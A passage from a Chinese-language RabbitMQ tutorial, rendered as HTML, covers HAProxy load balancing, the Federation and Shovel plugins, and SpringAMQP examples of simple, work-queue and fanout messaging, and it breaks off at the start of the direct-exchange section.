/></p></li><li><p>在node1上创建一个队列发送一条消息，队列存在镜像队列</p></li></ol><h2 id="113-实现高可用负载均衡"><a class="markdownIt-Anchor" href="#113-实现高可用负载均衡"></a> 11.3 实现高可用负载均衡</h2><p>HAProxy.提供高可用性、负载均衡及基于TCPHTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案，包括Twitter,Reddit,StackOverflow,GitHub.在内的多家知名互联网公司在使用。HAProxy实现了一种事件驱动、单一进程模型，此模型支持非常大的井发连接数。<br />扩展nginx,lvs,haproxx.p间的区别: <a href="http://www.ha97.com/5646.html">http://www.ha97.com/5646.html</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161725946.png" alt="image-20230113161725946" /></p><h2 id="114-federation-exchange"><a class="markdownIt-Anchor" href="#114-federation-exchange"></a> 11.4 Federation Exchange</h2><blockquote><p>使用原因</p></blockquote><p>(broker北京)，(broker深圳)彼此之间相距甚远，网络延迟是一个不得不面对的问题。有一个在北京的业务(Client北京)需要连接(broker北京),向其中的交换器exchangeA.发送消息，此时的网络延迟很小,(Client北京)可以迅速将消息发送至exchangeA.中，就算在开启了publisherconfirm.机制或者事务机制的情况下，也可以迅速收到确认信息。此时又有个在深圳的业务(Client深圳)需要向exchangeA发送消息，那么(Client深圳)(broker北京)之间有很大的网络延迟，(Client深圳)将发送消息至exchangeA会经历一定的延迟，尤其是在开启了publisherconfirm.机制或者事务机制的情况下，(Client深圳)会等待很长的延迟时间来接收(broker北京)的确认信息，进而必然造成这条发送线程的性能降低，甚至造成一定程度上的阻塞。<br />将业务(Client深圳)部署到北京的机房可以解决这个问题，但是如果(Client深圳)调用的另些服务都部署在深圳，那么又会引发新的时延问题，总不见得将所有业务全部部署在一个机房，那么容灾又何以实现?这里使用Federation插件就可以很好地解决这个问题.</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161826128.png" alt="image-20230113161826128" /></p><blockquote><p>搭建步骤</p></blockquote><ol><li><p>需要保证每台节点单独运行</p></li><li><p>在每台机器上开启federation相关插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">每台节点均需执行以下命令</span><br>rabbitmq-plugins enable rabbitmq_federation<br>rabbitmq-plugns enable rabbitmq_federation_management<br></code></pre></td></tr></table></figure></li><li><p>原理图</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161854512.png" alt="image-20230113161854512" /></p></li><li><p>在下游节点（node2）配置上游节点（node1）</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161909762.png" alt="image-20230113161909762" /></p><p>​</p></li><li><p>添加policy</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161933222.png" alt="image-20230113161933222" /></p></li><li><p>成功</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161940946.png" alt="image-20230113161940946" /></p></li></ol><h2 id="115-federation-queue"><a class="markdownIt-Anchor" href="#115-federation-queue"></a> 11.5 Federation Queue</h2><blockquote><p>使用原因</p></blockquote><p>联邦队列可以在多个Broker节点(或者集群)之间为单个队列提供均衡负载的功能。一个联邦队列可以连接一个或者多个上游队列(upstream queue)，并从这些上游队列中获取消息以满足本地消费者消费消息的需求。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161958144.png" alt="image-20230113161958144" /></p><ol><li><p>添加上下游配置（同11.4）</p></li><li><p>添加policy</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162007236.png" alt="image-20230113162007236" /></p></li></ol><h2 id="116-shovel"><a class="markdownIt-Anchor" href="#116-shovel"></a> 11.6 Shovel</h2><blockquote><p>使用原因</p></blockquote><p>Federation具备的数据转发功能类似，Shovel够可靠、持续地从一个Broker中的队列(作为源端，即source)拉取数据并转发至另一个Broker中的交换器(作为目的端，即destination)。作为源端的队列和作为目的端的交换器可以同时位于同一个Broker，也可以位于不同的Broker上。Shovel可以翻译为&quot;铲子&quot;,是一种比较形象的比喻，这个&quot;铲子&quot;可以将消息从一方&quot;铲子&quot;另一方。Shovel行为就像优秀的客户端应用程序能够负责连接源和目的地、负责消息的读写及负责连接失败问题的处理。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162035021.png" alt="image-20230113162035021" /></p><blockquote><p>搭建步骤</p></blockquote><ol><li><p>开启插件（需要的机器都开启）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmq-plugins enable rabbitmq_shovel<br>rabbitmq-plugins enable rabbitmq_shovel_management<br></code></pre></td></tr></table></figure></li><li><p>添加shevel源和目的地</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162046992.png" alt="image-20230113162046992" /></p></li></ol><h1 id="12-springamqp"><a class="markdownIt-Anchor" href="#12-springamqp"></a> 12. SpringAMQP</h1><p>SpringAMQP是基于RabbitMQ封装的一套模板，并且还利用SpringBoot对其实现了自动装配，使用起来非常方便。</p><p>SpringAmqp的官方地址：<a href="https://spring.io/projects/spring-amqp">https://spring.io/projects/spring-amqp</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457950.png" alt="image-20210717164024967" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457951.png" alt="image-20210717164038678" /></p><p>SpringAMQP提供了三个功能：</p><ul><li>自动声明队列、交换机及其绑定关系</li><li>基于注解的监听器模式，异步接收消息</li><li>封装了RabbitTemplate工具，用于发送消息</li></ul><h2 id="121basic-queue-简单队列模型"><a class="markdownIt-Anchor" href="#121basic-queue-简单队列模型"></a> 12.1.Basic Queue 简单队列模型</h2><p>在父工程mq-demo中引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--AMQP依赖，包含RabbitMQ--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1211消息发送"><a class="markdownIt-Anchor" href="#1211消息发送"></a> 12.1.1.消息发送</h3><p>首先配置MQ地址，在publisher服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.123</span><span class="hljs-number">.128</span> <span class="hljs-comment"># 主机名</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span> <span class="hljs-comment"># 端口</span><br>    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span> <span class="hljs-comment"># 虚拟主机</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">RabbitMQ</span> <span class="hljs-comment"># 用户名</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">RabbitMQ</span> <span class="hljs-comment"># 密码</span><br></code></pre></td></tr></table></figure><p>然后在publisher服务中编写测试类SpringAmqpTest，并利用RabbitTemplate实现消息发送：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.spring;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.junit.runner.RunWith;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringRunner;<br><br><span class="hljs-meta">@RunWith(SpringRunner.class)</span><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringAmqpTest</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSimpleQueue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 队列名称</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;simple.queue&quot;</span>;<br>        <span class="hljs-comment">// 消息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, spring amqp!&quot;</span>;<br>        <span class="hljs-comment">// 发送消息</span><br>        rabbitTemplate.convertAndSend(queueName, message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1212消息接收"><a class="markdownIt-Anchor" href="#1212消息接收"></a> 12.1.2.消息接收</h3><p>首先配置MQ地址，在consumer服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.101</span> <span class="hljs-comment"># 主机名</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span> <span class="hljs-comment"># 端口</span><br>    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span> <span class="hljs-comment"># 虚拟主机</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">itcast</span> <span class="hljs-comment"># 用户名</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123321</span> <span class="hljs-comment"># 密码</span><br></code></pre></td></tr></table></figure><p>然后在consumer服务的<code>cn.itcast.mq.listener</code>包中新建一个类SpringRabbitListener，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.listener;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRabbitListener</span> &#123;<br><br>    <span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenSimpleQueueMessage</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        System.out.println(<span class="hljs-string">&quot;spring 消费者接收到消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1213测试"><a class="markdownIt-Anchor" href="#1213测试"></a> 12.1.3.测试</h3><p>启动consumer服务，然后在publisher服务中运行测试代码，发送MQ消息</p><h2 id="122workqueue"><a class="markdownIt-Anchor" href="#122workqueue"></a> 12.2.WorkQueue</h2><p>Work queues，也被称为（Task queues），任务模型。简单来说就是<strong>让多个消费者绑定到一个队列，共同消费队列中的消息</strong>。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457952.png" alt="image-20210717164238910" /></p><p>当消息处理比较耗时的时候，可能生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。</p><p>此时就可以使用work 模型，多个消费者共同处理消息处理，速度就能大大提高了。</p><h3 id="1221消息发送"><a class="markdownIt-Anchor" href="#1221消息发送"></a> 12.2.1.消息发送</h3><p>这次我们循环发送，模拟大量消息堆积现象。</p><p>在publisher服务中的SpringAmqpTest类中添加一个测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * workQueue</span><br><span class="hljs-comment">     * 向队列中不停发送消息，模拟消息堆积。</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWorkQueue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;simple.queue&quot;</span>;<br>    <span class="hljs-comment">// 消息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, message_&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>        <span class="hljs-comment">// 发送消息</span><br>        rabbitTemplate.convertAndSend(queueName, message + i);<br>        Thread.sleep(<span class="hljs-number">20</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1222消息接收"><a class="markdownIt-Anchor" href="#1222消息接收"></a> 12.2.2.消息接收</h3><p>要模拟多个消费者绑定同一个队列，我们在consumer服务的SpringRabbitListener中添加2个新的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenWorkQueue1</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者1接收到消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span> + LocalTime.now());<br>    Thread.sleep(<span class="hljs-number">20</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenWorkQueue2</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    System.err.println(<span class="hljs-string">&quot;消费者2........接收到消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span> + LocalTime.now());<br>    Thread.sleep(<span class="hljs-number">200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到这个消费者sleep了1000秒，模拟任务耗时。</p><h3 id="1223测试"><a class="markdownIt-Anchor" href="#1223测试"></a> 12.2.3.测试</h3><p>启动ConsumerApplication后，在执行publisher服务中刚刚编写的发送测试方法testWorkQueue。</p><p>可以看到消费者1很快完成了自己的25条消息。消费者2却在缓慢的处理自己的25条消息。</p><p>也就是说消息是平均分配给每个消费者，并没有考虑到消费者的处理能力。这样显然是有问题的。</p><h3 id="1224能者多劳"><a class="markdownIt-Anchor" href="#1224能者多劳"></a> 12.2.4.能者多劳</h3><p>在spring中有一个简单的配置，可以解决这个问题。我们修改consumer服务的application.yml文件，添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">listener:</span><br>      <span class="hljs-attr">simple:</span><br>        <span class="hljs-attr">prefetch:</span> <span class="hljs-number">1</span> <span class="hljs-comment"># 每次只能获取一条消息，处理完成才能获取下一个消息</span><br></code></pre></td></tr></table></figure><h3 id="1225总结"><a class="markdownIt-Anchor" href="#1225总结"></a> 12.2.5.总结</h3><p>Work模型的使用：</p><ul><li>多个消费者绑定到一个队列，同一条消息只会被一个消费者处理</li><li>通过设置prefetch来控制消费者预取的消息数量</li></ul><h2 id="123发布订阅"><a class="markdownIt-Anchor" href="#123发布订阅"></a> 12.3.发布/订阅</h2><p>发布订阅的模型如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457953.png" alt="image-20210717165309625" /></p><p>可以看到，在订阅模型中，多了一个exchange角色，而且过程略有变化：</p><ul><li>Publisher：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）</li><li>Exchange：交换机，图中的X。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：<ul><li>Fanout：广播，将消息交给所有绑定到交换机的队列</li><li>Direct：定向，把消息交给符合指定routing key 的队列</li><li>Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列</li></ul></li><li>Consumer：消费者，与以前一样，订阅队列，没有变化</li><li>Queue：消息队列也与以前一样，接收消息、缓存消息。</li></ul><p><strong>Exchange（交换机）只负责转发消息，不具备存储消息的能力</strong>，因此如果没有任何队列与Exchange绑定，或者没有符合路由规则的队列，那么消息会丢失！</p><h2 id="124fanout"><a class="markdownIt-Anchor" href="#124fanout"></a> 12.4.Fanout</h2><p>Fanout，英文翻译是扇出，我觉得在MQ中叫广播更合适。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457954.png" alt="image-20210717165438225" /></p><p>在广播模式下，消息发送流程是这样的：</p><ul><li>1）  可以有多个队列</li><li>2）  每个队列都要绑定到Exchange（交换机）</li><li>3）  生产者发送的消息，只能发送到交换机，交换机来决定要发给哪个队列，生产者无法决定</li><li>4）  交换机把消息发送给绑定过的所有队列</li><li>5）  订阅队列的消费者都能拿到消息</li></ul><p>我们的计划是这样的：</p><ul><li>创建一个交换机 itcast.fanout，类型是Fanout</li><li>创建两个队列fanout.queue1和fanout.queue2，绑定到交换机itcast.fanout</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457955.png" alt="image-20210717165509466" /></p><h3 id="1241声明队列和交换机"><a class="markdownIt-Anchor" href="#1241声明队列和交换机"></a> 12.4.1.声明队列和交换机</h3><p>Spring提供了一个接口Exchange，来表示所有不同类型的交换机：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457956.png" alt="image-20210717165552676" /></p><p>在consumer中创建一个类，声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Binding;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.BindingBuilder;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.FanoutExchange;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FanoutConfig</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 声明交换机</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Fanout类型交换机</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FanoutExchange <span class="hljs-title function_">fanoutExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FanoutExchange</span>(<span class="hljs-string">&quot;itcast.fanout&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 第1个队列</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">fanoutQueue1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">&quot;fanout.queue1&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 绑定队列和交换机</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">bindingQueue1</span><span class="hljs-params">(Queue fanoutQueue1, FanoutExchange fanoutExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 第2个队列</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">fanoutQueue2</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">&quot;fanout.queue2&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 绑定队列和交换机</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">bindingQueue2</span><span class="hljs-params">(Queue fanoutQueue2, FanoutExchange fanoutExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1242消息发送"><a class="markdownIt-Anchor" href="#1242消息发送"></a> 12.4.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFanoutExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.fanout&quot;</span>;<br>    <span class="hljs-comment">// 消息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, everyone!&quot;</span>;<br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1243消息接收"><a class="markdownIt-Anchor" href="#1243消息接收"></a> 12.4.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加两个方法，作为消费者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = &quot;fanout.queue1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenFanoutQueue1</span><span class="hljs-params">(String msg)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者1接收到Fanout消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(queues = &quot;fanout.queue2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenFanoutQueue2</span><span class="hljs-params">(String msg)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者2接收到Fanout消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1244总结"><a class="markdownIt-Anchor" href="#1244总结"></a> 12.4.4.总结</h3><p>交换机的作用是什么？</p><ul><li>接收publisher发送的消息</li><li>将消息按照规则路由到与之绑定的队列</li><li>不能缓存消息，路由失败，消息丢失</li><li>FanoutExchange的会将消息路由到每个绑定的队列</li></ul><p>声明队列、交换机、绑定关系的Bean是什么？</p><ul><li>Queue</li><li>FanoutExchange</li><li>Binding</li></ul><p>多消费者订阅一个队列会发生什么情况？</p><ul><li>该队列相当于WorkQueue</li></ul><h2 id="125direct"><a class="markdownIt-Anchor" href="#125direct"></a> 12.5.Direct</h2><p>在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457957.png" alt="image-20210717170041447" /></p><p>在Direct模型下：</p><ul><li>队列与交换机的绑定，不能是任意绑定了，而是要指定一个<code>RoutingKey</code>（路由key）</li><li>消息的发送方在 向 Exchange发送消息时，也必须指定消息的 <code>RoutingKey</code>。</li><li>Exchange不再把消息交给每一个绑定的队列，而是根据消息的<code>Routing Key</code>进行判断，只有队列的<code>Routingkey</code>与消息的 <code>Routing key</code>完全一致，才会接收到消息</li></ul><p><strong>案例需求如下</strong>：</p><ol><li><p>利用@RabbitListener声明Exchange、Queue、RoutingKey</p></li><li><p>在consumer服务中，编写两个消费者方法，分别监听direct.queue1和direct.queue2</p></li><li><p>在publisher中编写测试方法，向itcast. direct发送消息</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457958.png" alt="image-20210717170223317" /></p><h3 id="1251基于注解声明队列和交换机"><a class="markdownIt-Anchor" href="#1251基于注解声明队列和交换机"></a> 